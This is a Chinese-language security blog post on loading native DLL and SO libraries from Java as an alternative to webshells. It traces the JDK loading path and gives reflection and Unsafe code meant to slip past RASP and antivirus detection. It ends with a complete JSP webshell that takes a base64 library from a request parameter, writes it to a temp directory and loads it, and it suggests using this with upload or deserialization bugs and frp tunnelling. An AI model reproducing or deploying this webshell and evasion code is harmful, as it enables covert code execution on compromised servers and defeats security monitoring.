## Java加载动态链接库

### 前言

前段时间在**赛博回忆录群聊**中看到师傅们谈论Java加载动态链接库的方法，研究之后，笔者认为该方案某种程度上是可以替代webshell一种方式。

文中研究代码会上传到[JavaLearnVulnerability](https://github.com/SummerSec/JavaLearnVulnerability/tree/master/Rce_Echo/TomcatEcho)项目上。

---

### 加载动态链接库

群中聊天记录存在着相似的代码片段，dll下载地址仓库[3gstudent/test](https://github.com/3gstudent/test)。

```java
public static  void loadDll3(){
    try {
        System.load("D:\\temp\\calc_x64.dll");
    }catch (UnsatisfiedLinkError e){
        e.printStackTrace();
    }
}
```

![image-20220124115239143](https://img.sumsec.me//46u5246ec46u5246ec.png)

可以看到可以直接调用System.load方法进行直接加载dll文件。

---

### load调用流程

跟进去可以发现**load**方法调用**Runtime.getRuntime().load0**方法，filename是传入文件名。也就是说我们也可以调用Runtime的load方法进行加载动态链接库。

![image-20220124130944696](https://img.sumsec.me//44u944ec44u944ec.png)

但其实发现**load0**方法是无法直接调用的，但可以直接调用**load**方法从而间接调用**load0**方法。



![image-20220124131158138](https://img.sumsec.me//58u1158ec58u1158ec.png)

在**load0**方法的最后一行是调用**ClassLoader**的**loadLibrary**方法，传入的参数依次是当前类，和文件名，已经是否是绝对路径。

![image-20220124131440998](https://img.sumsec.me//41u1441ec41u1441ec.png)

进行跟进**ClassLoader#loadLibrary**方法，方法声明写着一行注释。主要说明loadLibrary方法在`java.lang.Runtime`类中调用实现了**load**和**loadLibrary**方法。

```java
// Invoked in the java.lang.Runtime class to implement load and loadLibrary.
static void loadLibrary(Class<?> fromClass, String name,
                        boolean isAbsolute) {
    ClassLoader loader =
        (fromClass == null) ? null : fromClass.getClassLoader();
    if (sys_paths == null) {
        usr_paths = initializePath("java.library.path");
        sys_paths = initializePath("sun.boot.library.path");
    }
    if (isAbsolute) {
        if (loadLibrary0(fromClass, new File(name))) {
            return;
        }
        throw new UnsatisfiedLinkError("Can't load library: " + name);
    }
    if (loader != null) {
        String libfilename = loader.findLibrary(name);
        if (libfilename != null) {
            File libfile = new File(libfilename);
            if (!libfile.isAbsolute()) {
                throw new UnsatisfiedLinkError(
"ClassLoader.findLibrary failed to return an absolute path: " + libfilename);
            }
            if (loadLibrary0(fromClass, libfile)) {
                return;
            }
            throw new UnsatisfiedLinkError("Can't load " + libfilename);
        }
    }
    for (int i = 0 ; i < sys_paths.length ; i++) {
        File libfile = new File(sys_paths[i], System.mapLibraryName(name));
        if (loadLibrary0(fromClass, libfile)) {
            return;
        }
        libfile = ClassLoaderHelper.mapAlternativeName(libfile);
        if (libfile != null && loadLibrary0(fromClass, libfile)) {
            return;
        }
    }
    if (loader != null) {
        for (int i = 0 ; i < usr_paths.length ; i++) {
            File libfile = new File(usr_paths[i],
                                    System.mapLibraryName(name));
            if (loadLibrary0(fromClass, libfile)) {
                return;
            }
            libfile = ClassLoaderHelper.mapAlternativeName(libfile);
            if (libfile != null && loadLibrary0(fromClass, libfile)) {
                return;
            }
        }
    }
    // Oops, it failed
    throw new UnsatisfiedLinkError("no " + name + " in java.library.path");
}
```



在判断传入的是否是绝对路径后就调用了**loadLibrary0**方法

![image-20220124132050291](https://img.sumsec.me//50u2050ec50u2050ec.png)

在**loadLibrary0**方法中会读取**nativeLibraryContext**内容，判断是否已经被其他的classloader加载过了。

![image-20220124134336447](https://img.sumsec.me//36u4336ec36u4336ec.png)

紧接着会实例化**NativeLibrary**类，然后调用load方法加载动态链接库。

![image-20220124134528474](https://img.sumsec.me//28u4528ec28u4528ec.png)

NativeLibrary是**classloader**中的一个静态匿名类，NativeLibrary中的load方法内容如下，可以发现是已经到native层面了。

```java
native void load(String name, boolean isBuiltin);
```

---

### 模拟load方法加载动态链接库

#### 为什么模拟?

已经可以使用System和Runtime类调用load方法加载动态链接库，为什么还要模拟NativeLibrary或者是ClassLoader类加载动态链接库呢？

1. 在webshell查杀工具、RASP、终端安全防护软件等安全软件工具会容易检测到System和Runtime的调用，很容易就会被安全软件查杀。大家都知道越到底层的查杀会越来越难，细想一下Native层面查杀成本就很高了。
2. 模拟load方法可以避免中间过程异常从而导致加载失败，在Java层面调用越少就不容易出错，兼容性也会大大的提升。

---

首先来看JDK中内置的可以加载动态链接库的几个方法

```java
public static void loadDll2(){
    Runtime.getRuntime().load("D:\\temp\\calc_x64.dll");
}

public static  void loadDll3(){
    try {
        System.load("D:\\temp\\calc_x64.dll");
    }catch (UnsatisfiedLinkError e){
        e.printStackTrace();
    }
}
public static void loadDll4(){
        com.sun.glass.utils.NativeLibLoader.loadLibrary("\\..\\..\\..\\..\\..\\..\\..\\..\\temp\\calc_x64");
}
```

loadDll2和loadDll3是都是具有高危类的调用，而loadDll4并不是在所有的环境都是通用的。

**com.sun.glass.utils.NativeLibLoader.loadLibrary**在写这篇文章的前两天看到浅蓝师傅的文章[探索高版本 JDK 下 JNDI 漏洞的利用方法](https://tttang.com/archive/1405/)提到的。

为什么这个com.sun.glass.utils.NativeLibLoader类并不是通用的呢？

1. 存在于jdk\javafx-src.zip!\com\sun\glass\utils\NativeLibLoader.java，在不同的版本的jdk中javafx并不是都存在的。
2. NativeLibLoader会首先在jdk环境下找文件名，如果需要自定义路径必须使用\.\./的方式进行目录穿越。并且如果是windows的话，只能穿越到JDK所在的盘符的根目录下。举例说明，如果JDK安装在`D:/java/JDK/`下，那么只能穿越到D盘的任意目录下面，比例说穿越到D:/temp/目录下，文件名参数就只能写成**../../../../temp/calc**，文件名还不能跟后缀，不然传入文件名会被变成**calc.dll.dll**。相对而言Linux平台是可以穿越任意目录的。

---

#### 如何模拟？

* 如果模拟ClassLoader加载就会存在两个方案
    * 模拟ClassLoader的loadLibrary和loadLibrary0两个方案。

* 如果模拟NativeLibrary就只存在load方法

**ClassLoader#loadLibrary**

loadLibrary方法是静态私有方法，无法直接调用。使用Java反射就能解决该问题代码如下：

```
    public static void loadDll(){
        try {
            Class clazz = Class.forName("java.lang.ClassLoader");
            Method method = clazz.getDeclaredMethod("loadLibrary", Class.class, String.class, boolean.class);
            method.setAccessible(true);
            method.invoke(null, clazz, "D:\\temp\\calc_x64.dll", true);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
```

**ClassLoader#loadLibrary0**代码类似就不贴了。

**NativeLibrary#load**

由于NativeLibrary是ClassLoader的内部静态匿名类，无法直接进行实例化，进而调用load方法。解决方案有两种方式

* 使用反射获取构造方法，修改权限进而实例化，获取load方法、调用、传入参数。

```java
String file = "D:\\temp\\calc_x64.dll";
Class a = Class.forName("java.lang.ClassLoader$NativeLibrary");
Constructor con = a.getDeclaredConstructor(new Class[]{Class.class,String.class,boolean.class});
con.setAccessible(true);
Object obj = con.newInstance(JDKClassLoaderBypass.class,file,true);
Method method = obj.getClass().getDeclaredMethod("load", String.class, boolean.class);
method.setAccessible(true);
method.invoke(obj, file, false);
```

* 使用Unsafe类的**allocateInstance**方法获取实例类，由于unsafe的特性可以无视构造方法强制进行实例化，可以完美绕过限制，这种方法可以更好绕过RASP之类的安全防护。

```java
String file = "D:\\temp\\calc_x64.dll";
Class aClass = Class.forName("sun.misc.Unsafe");
Constructor<?> declaredConstructor = aClass.getDeclaredConstructor();
declaredConstructor.setAccessible(true);
Unsafe unsafe = (Unsafe)declaredConstructor.newInstance();
Object obj =  unsafe.allocateInstance(a);
Method method = obj.getClass().getDeclaredMethod("load", String.class, boolean.class);
method.setAccessible(true);
method.invoke(obj, file, false);
```



----



### 实战化解决方案

#### 差异性

 与传统的webshell对比一下，可达到免杀的效果。使用项目[Rvn0xsy/SystemGap](https://github.com/Rvn0xsy/SystemGap)也可实现小马的效果，不同于传统的小马，这个可加个签名轻松做到免杀效果。对比传统webshell可以将frp等代理工具作为动态链接库形式发送给后端，直接写入目标服务器上。某种程度上是可以取代传统webshell，在某些操作还更加比webshell更加方便。比例说，上传frp、socks代理等操作，可以采用预先设置好命令，直接加载相应的动态链接库，直接一键化实现内网穿透。



#### 解决方案

团队师傅写一个静态资源页面[**Dynamic Link Library Loader Tools**](https://loader.sumsec.me/)项目临时地址[**loader**](https://github.com/SummerSec/Loader)就实现了上述功能，更多功能还在完善中，后续会更新到[**0x727**](https://github.com/0x727)团队项目中。

对应加载动态链接库的恶意代码，以jsp代码形式。其实完全是可以改造成内存马的形式，也可以配合反序列化漏洞，上传漏洞等使用。

<details> 
    <summary>Codes </summary>

~~~java
```java
<%
    String p = request.getParameter("p");
    String t = request.getServletContext().getRealPath("/");
    java.io.PrintWriter outp = response.getWriter();
    outp.println("WebRootPath:<br>" + t + "<br>");
    t = request.getServletPath();
    outp.println("ServletPath:<br>" + t + "<br>");
    t = (new java.io.File(".").getAbsolutePath());
    outp.println("WebServerPath:<br>" + t + "<br>");
    java.util.Random random = new java.util.Random(System.currentTimeMillis());
    outp.println("If you upload a dynamic link library it will be automatically uploaded to the system temp path. <br>" +
            " If it is Windows it will be uploaded to C:/Windows/temp/, " +
            "else if it is Linux it will be uploaded to the /tmp/ path <br>");

    t = System.getProperty("os.name").toLowerCase();
    if (t.contains("windows")) {
        t = "C:/Windows/temp/dm" + random.nextInt(10000000) + "1.dll";
    }else {
        t = "/tmp/dm" + random.nextInt(10000000) + "1.so";
    }
    if (p != null) {
        try {
            java.io.FileOutputStream fos = new java.io.FileOutputStream(t);
            fos.write(D(p));
            fos.close();
            N(t);
            outp.println("Dynamic Link Library is uploaded, and the path is: " + t + "<br>");
            outp.println("load uploaded success !!! <br>");
        } catch (Exception e) {
            outp.println(e.getMessage());
        }
    }
    outp.flush();
    outp.close();
%>

<%!
    private void N(String t) throws Exception {
        Object o;
        Class a = Class.forName("java.lang.ClassLoader$NativeLibrary");
        try {
            java.lang.reflect.Constructor c = a.getDeclaredConstructor(new Class[]{Class.class,String.class,boolean.class});
            c.setAccessible(true);
            o = c.newInstance(Class.class,t,true);
        }catch (Exception e){
            Class u = Class.forName("sun.misc.Unsafe");
            java.lang.reflect.Constructor<?> c = u.getDeclaredConstructor();
            c.setAccessible(true);
            sun.misc.Unsafe un = (sun.misc.Unsafe)c.newInstance();
            o =  un.allocateInstance(a);
        }
        java.lang.reflect.Method method = o.getClass().getDeclaredMethod("load", String.class, boolean.class);
        method.setAccessible(true);
        method.invoke(o, t, false);
    }

    private byte[] D(String p) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])(clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), p));
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[])(decoder.getClass().getMethod("decode", String.class).invoke(decoder, p));
        }
    }
%>
```
~~~
</details>



**效果展示**

假如已经通过文件上传、RCE等方式上传了前面提到jsp木马。木马会输出一些信息，目前上传路径是写死的，后续这个可以改（以任何方式，这个不重要）。

![image-20220126201326631](https://img.sumsec.me//33u1333ec33u1333ec.png)

然后**Dynamic Link Library Loader Tools**输入url，选择Payload（目前只有弹计算器）。

![image-20220126201629504](https://img.sumsec.me//34u1634ec34u1634ec.png)

点击**提交**，会发送一个请求包以POST方法，发送p = ${payload}$资源。最终会跳转到对应url上，并在目标服务器弹出计算器。

![image-20220126202040625](https://img.sumsec.me//40u2040ec40u2040ec.png)

---

### 总结

目前只研究了Java加载动态链接库的方式，并实现了在Java层面最本质的加载方式。rebeyond 大佬在[《Java内存攻击技术漫谈》](https://mp.weixin.qq.com/s/JIjBjULjFnKDjEhzVAtxhw)提及了**Java跨平台任意Native代码执行**，后续可能有望实现无文件加载动态链接库的方式，所以目前来看该技术前景还是很大的。

加载动态链接库的方式可以实现传统webshell的部分功能（严谨），也能做到一些无法做到一些事情。试想如果动态链接库加上签名，那么终端对抗难度会降低，这也是与传统webshell的区别所在，也是一种特性。但与此同时，此技术还在初级发展阶段，还有很多需要改进的地方。





----



### 参考

https://tttang.com/archive/1405
